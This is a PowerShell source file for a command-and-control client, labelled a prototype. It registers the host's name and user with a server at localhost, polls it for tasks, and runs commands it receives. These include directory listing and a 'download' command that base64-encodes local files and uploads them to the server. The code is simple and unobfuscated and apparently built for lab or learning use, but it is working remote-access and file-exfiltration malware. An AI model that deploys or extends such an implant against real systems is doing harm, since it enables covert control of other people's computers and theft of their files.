# C2 Prototype - PowerShell Client

$ServerUrl = "http://localhost:5000"
$PollInterval = 3
$ClientId = -join ((48..57) + (97..102) | Get-Random -Count 8 | ForEach-Object { [char]$_ })

function Register {
    $body = @{
        client_id = $ClientId
        hostname  = $env:COMPUTERNAME
        username  = $env:USERNAME
        os        = "windows-ps"
        cwd       = (Get-Location).Path
    } | ConvertTo-Json
    Invoke-RestMethod -Uri "$ServerUrl/api/register" -Method Post -Body $body -ContentType "application/json" | Out-Null
}

function Poll-Task {
    Register
    $resp = Invoke-RestMethod -Uri "$ServerUrl/api/tasks/$ClientId" -Method Get
    return $resp.task
}

function Submit-Result($TaskId, $Result) {
    $body = @{
        task_id = $TaskId
        result  = $Result
    } | ConvertTo-Json -Depth 5
    Invoke-RestMethod -Uri "$ServerUrl/api/results/$ClientId" -Method Post -Body $body -ContentType "application/json" | Out-Null
}

function Do-Ls($Path) {
    $target = if ($Path) { $Path } else { "." }
    try {
        $fullPath = (Resolve-Path $target).Path
        $items = Get-ChildItem -Path $fullPath -Force | ForEach-Object {
            @{
                name   = $_.Name
                is_dir = $_.PSIsContainer
                size   = if ($_.PSIsContainer) { 0 } else { $_.Length }
            }
        }
        if ($null -eq $items) { $items = @() }
        if ($items -isnot [array]) { $items = @($items) }
        return @{ entries = $items; path = $fullPath }
    }
    catch {
        return @{ error = $_.Exception.Message }
    }
}

function Do-Cd($Path) {
    if (-not $Path) { return @{ error = "No path provided" } }
    try {
        Set-Location $Path
        return @{ output = "Changed to $((Get-Location).Path)" }
    }
    catch {
        return @{ error = $_.Exception.Message }
    }
}

function Do-Download($Path) {
    if (-not $Path) { return @{ error = "No path provided" } }
    try {
        $full = (Resolve-Path $Path).Path
        $fi = Get-Item $full
        if ($fi.Length -gt 50MB) {
            return @{ error = "File too large: $($fi.Length) bytes" }
        }
        $bytes = [System.IO.File]::ReadAllBytes($full)
        $b64 = [Convert]::ToBase64String($bytes)
        return @{
            filename = $fi.Name
            path     = $full
            size     = $fi.Length
            data_b64 = $b64
        }
    }
    catch {
        return @{ error = $_.Exception.Message }
    }
}

function Handle-Task($Task) {
    switch ($Task.command) {
        "ls"       { return Do-Ls $Task.args }
        "cd"       { return Do-Cd $Task.args }
        "pwd"      { return @{ output = (Get-Location).Path } }
        "download" { return Do-Download $Task.args }
        "ping"     { return @{ output = "pong" } }
        default    { return @{ error = "Unknown command: $($Task.command)" } }
    }
}

# --- Main ---
Write-Host "[+] Client ID: $ClientId"

while ($true) {
    try {
        Register
        Write-Host "[+] Registered with server"
        break
    }
    catch {
        Write-Host "[-] Server not available, retrying in 5s..."
        Start-Sleep -Seconds 5
    }
}

Write-Host "[*] Polling every ${PollInterval}s. Press Ctrl+C to stop."

while ($true) {
    try {
        $task = Poll-Task
        if ($task) {
            Write-Host "[*] Got task: $($task.command) $($task.args)"
            $result = Handle-Task $task
            Submit-Result $task.id $result
        }
    }
    catch {
        Write-Host "[-] Connection error, retrying..."
    }
    Start-Sleep -Seconds $PollInterval
}
